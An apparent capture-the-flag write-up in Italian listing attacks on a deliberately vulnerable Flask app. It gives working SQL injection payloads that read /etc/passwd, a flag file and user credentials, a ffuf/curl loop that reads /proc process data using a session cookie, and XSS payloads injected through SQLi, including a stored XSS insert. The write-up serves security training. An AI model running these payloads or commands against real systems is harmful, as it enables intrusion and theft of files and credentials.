LISTA DEGLI ATTACCHI POSSIBILI
==============================

## SCHERMATA DI LOGIN
Tra gli attacchi possibili sul modulo di autenticazione troviamo:

- information disclosure
    - `<!-- Mike rimuovi questo commento prima di rilasciare il form -->` / all'interno del codice sorgente della pagina pubblicamente visibile
- dictionary attacks
    - password utilizzata dall'utente legittimo del sistema facilmente individuabile all'interno di un dizionario di password
- authentication bypass
    - `https://0.0.0.0:5000/login?god` / presenza di una backdoor dimenticata dagli sviluppatori

## BLOG
Tra gli attacchi possibili sul modulo per l'aggiunta di commenti troviamo:

- cross site request forgery (CSRF)
    - il modulo non presenta un token per validare la richiesta
- cross site scripting reflected (XSS)
- cross site scripting stored (XSS)
- sql injection (SQLI)

### SQLi su input toSearch
#### SQLi
##### Stabilizzatore
```sql
\%' or 1=1 -- # => true
\%' or 1=2 -- # => false
```

##### Colonne tabella
```sql
\%' or 1=1 order by 1 -- #	=> una colonna di risultato
```

##### Database
```sql
\%' or 1=1 UNION ALL SELECT database() -- # => foo
```

##### Utente
```sql
\%' or 1=1 UNION ALL SELECT user() -- # => guest@localhost
```

##### Lettura file di sistema
```sql
\%' or 1=1 UNION ALL SELECT LOAD_FILE('/etc/passwd') -- #
```

facendo un pò di enumerazione su i processi attivi all'interno del sistema si può arrivare a leggere qualcosa di molto interessante

```sql
\%' or 1=1 UNION ALL SELECT LOAD_FILE('/home/master/flask_buggy_app/flag.txt') -- #
```
il quale ritrova la flag per completare la sfida.

L'utilizzo della funzionalità **LOAD_FILE** è possibile a seguito di una configurazione errata dei privilegi dell'utente _guest_ il quale oltre ad avere tutti i privilegi sul database __foo__ ha anche i privilegi di accesso in lettura ai file sull'intero server.

Oltretutto il flag __secure_file_priv__ è disabilitato sul server, quindi l'utente in questione può leggere tutti i file accessibili sul sistema per i quali ha di accesso in lettura privilegi.

##### Enumerazione processi
```bash
# PID estratti dal server 
for i in $(seq 1 5000); do echo $i >> pid.txt; done && ffuf -c -w pid.txt:FUZZ -H "Cookie: session=eyJhdXRoZW50aWNhdGVkIjp0cnVlfQ.Y7afKw.sP3DmDbDZ3gmXu0FfNI9vRDdFs4" -u "http://172.17.255.215:8000/search?toSearch=%5C%25'%20or%201=1%20UNION%20ALL%20SELECT%20LOAD_FILE('/proc/FUZZ/cmdline')%20--%20#" -fw 1

# Estrazione informazioni dai pid ottenuti
while read -r pid; do curl -s --cookie "session=eyJhdXRoZW50aWNhdGVkIjp0cnVlfQ.Y7afKw.sP3DmDbDZ3gmXu0FfNI9vRDdFs4" "http://172.17.255.215:8000/search?toSearch=%5C%25'%20or%201=1%20UNION%20ALL%20SELECT%20LOAD_FILE('/proc/$pid/cmdline')%20--%20#" | jq ".[1]"; echo ; done < pid.lst
```
in questo modo è possibile individuare un pò dei processi attivi sul sistema andando a leggere alcune informazioni molto utili e se si è fortunati si potrebbe riuscire ad individuare il processo su cui è in esecuzione il web server leggendo di fatto le variabili d'ambiente ad esso associate.

##### Colonne tabella utente
```sql
\%' or 1=1 UNION ALL SELECT CONCAT(COLUMN_NAME) FROM information_schema.columns WHERE table_name = 'users' AND table_schema = 'foo' -- #
```

##### Dati tabella utente
```sql
\%' or 1=1 UNION ALL select CONCAT(username, '/', password) from foo.users -- # => Mike/hannahmontana
```

### XSS DOM
```js
\%' or 1=1 UNION ALL SELECT '<script>console.log("XSS")</script>' from foo.comments -- #
```
#### Bonus - esfiltrazione file di backup
```js
\%' or 1=1 UNION ALL SELECT '<script>document.write("<a href=backup.bak download>{{7*7}}</a>")</script>' from foo.comments -- #
```
funziona solo quando c'è almeno una riga

### XSS Stored
```js
\%' or 1=1; INSERT INTO foo.comments(comment) values('<script>alert("XSS")</script>') -- #
```
